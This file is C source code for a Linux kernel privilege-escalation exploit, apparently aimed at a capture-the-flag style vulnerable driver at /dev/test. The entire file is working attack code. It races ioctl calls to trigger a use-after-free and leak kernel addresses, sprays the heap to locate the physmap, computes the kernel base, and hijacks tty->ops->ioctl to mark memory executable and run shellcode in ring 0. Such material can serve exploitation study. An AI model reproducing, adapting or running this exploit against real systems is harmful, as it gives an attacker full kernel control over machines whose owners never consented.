#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>

#define test_ioctl_read		0x23333
#define test_ioctl_write	0x23334
#define test_ioctl_del		0x23335
#define thread_num		10	//local 0x10; server 10
#define mp_size			1024*64 //64K
#define spray_times		32*32	// heap spray size : 64K*16*32 = 32M
#define kernel_offset		0x106b4e0
#define set_memory_x		0x55580

void *spray[spray_times];
int fd = 0;
int ptmx;

struct data_struct
{
	unsigned long size;
	char *buf;
}data;

void error_quit(char *arg)
{
	perror(arg);
	exit(-1);
}

void ex(char *arg)
{
	fprintf(stderr,"%s\n",arg);
	exit(-1);
}

void *race_kill(void *arg)
{
	ioctl(fd,test_ioctl_del, &data);
	return NULL;
}

unsigned long race_read()
{
        void *mp;
	struct data_struct data;
	pthread_t tid[thread_num];
	int i;
	char buf[0x2c0];

	memset(buf, 'a', 0x20);
        if ((mp = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)
                error_quit("mmap error");
	data.size = 0x2c0;
	data.buf = (void *)buf;
	ioctl(fd, test_ioctl_read, &data);
	data.size = 7;
	data.buf = mp;

	for (i = 0; i < thread_num; i++)
		if (pthread_create(&tid[i], NULL, race_kill, NULL) != 0)
			error_quit("pthread_create error");
	ioctl(fd, test_ioctl_write, &data);
	for (i = 0; i < thread_num; i++)
		pthread_join(tid[i],NULL);
	data.size = 0x2c0;
	ioctl(fd, test_ioctl_read, &data);
        return *(unsigned long *)mp;
}

void write_through(unsigned long write_addr)
{
	int wfd;
	int ret;
	unsigned char *buf;
	ret = posix_memalign((void **)&buf, 512, 1024);
	if (ret)
		error_quit("posix_memalign failed");
	*(unsigned long *)buf = write_addr;
	wfd = open("./data", O_WRONLY | O_DIRECT | O_CREAT, 0755);
	if (wfd == -1)
		error_quit("open data failed");
	if (write(wfd, buf, 1024) < 0)
		error_quit("write data failed");

	free(buf);
	close(wfd);
}

void race_write()
{
	int i = 0;
	pthread_t tid[thread_num];
	int wfd = open("./data",O_RDWR);
	if (wfd == -1)
		error_quit("open data failed");
	char *p = mmap(NULL,4096,PROT_READ,MAP_PRIVATE,wfd,0);
	if (p == MAP_FAILED)
		error_quit("data mmap failed");
	data.buf = (void *)p;
	data.size = 0x2c0;
	for (i = 0; i < thread_num; i++)
		if (pthread_create(&tid[i], NULL, race_kill, NULL) != 0)
			error_quit("pthread_create error");	
	ioctl(fd, test_ioctl_read, &data);	
	for (i = 0; i < thread_num; i++)
		pthread_join(tid[i],NULL);
	ptmx = open("/dev/ptmx",O_RDWR);
	close(wfd);
}

void heap_spray()
{
	int i = 0;
	void *mp;
	for (i = 0; i < spray_times; i++)
	{
        	if ((mp = mmap(NULL, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)
                	error_quit("mmap error");
		memset(mp, 0, mp_size);
		spray[i] = mp;
	}	
}

unsigned long *check()
{
	int i = 0;
	for (i = 0; i < spray_times; i++)
	{
		unsigned long *p = spray[i];
		int j = 0;
		while (j < mp_size/8)
		{
			if (p[j] != 0)
				return &p[j];
			j += 512;
		}
	}
	return NULL;
}

int get_ptmx_slave()
{
	const char *pts_name;
	if (grantpt(ptmx) < 0 || unlockpt(ptmx) < 0) 
		error_quit("grantpt and unlockpt fail\n");

	pts_name = (const char *)ptsname(ptmx);
	int fds = open(pts_name, O_RDONLY | O_NOCTTY);
	if (fds < 0) 
		error_quit("open /dev/ptmx fail\n");
	return fds;
}

int main()
{
	// int t[0x100];
	int i = 0;
	/* for (i = 0; i < 0x100; i++)
	{
		t[i] = open("/dev/ptmx",O_RDWR);
		if (t[i] == -1)
			error_quit("open ptmx error");
	}
	for (i = 0; i < 0x100; i++)
		close(t[i]);
	*/
	unsigned long slab_addr;
	unsigned long kernel_base;
	int pts;
        if ((fd = open("/dev/test",O_RDWR)) == -1)
		error_quit("open test.ko error");
	slab_addr = race_read();
	if (slab_addr < 0xff000000000000)
	{
		char buf[0x100];
		sprintf(buf, "%s:0x%lx","slab addr failed",slab_addr);
		ex(buf);
	}
	slab_addr = slab_addr | 0xff00000000000000;
	printf("slab_addr:0x%lx\n",slab_addr);
	slab_addr = slab_addr & 0xffffffffff000000;
	heap_spray();
	write_through(slab_addr);
	unsigned long *p = NULL;
	while (i++ < 0x1000)
	{
		race_write();
		p = check();
		if (p != NULL)
			goto get_root;
		close(ptmx);
	}
	ex("physmap_addr not found");
get_root:
	kernel_base = p[3] - kernel_offset;
	printf("physmap_addr:%p = 0x%lx\n", p, slab_addr);
	printf("kernel base:0x%lx\n", kernel_base);
	pts = get_ptmx_slave();
	p[3] = slab_addr + 0x300;
	p[0x300/8+12] = kernel_base + set_memory_x;	// tty->ops->ioctl = set_memory_x
	ioctl(pts,0x2333,1);
	p[0x300/8+12] = slab_addr + 0x400;		// tty->ops->ioctl = shellcode
	memset((char *)p+0x400, 0x90, 0x100);		// place your shellcode here, it will run in ring0. gl hf.
	getchar();
	ioctl(pts,0x2333,1);	
	close(fd);
	close(pts);
	close(ptmx);
	return 0;
}
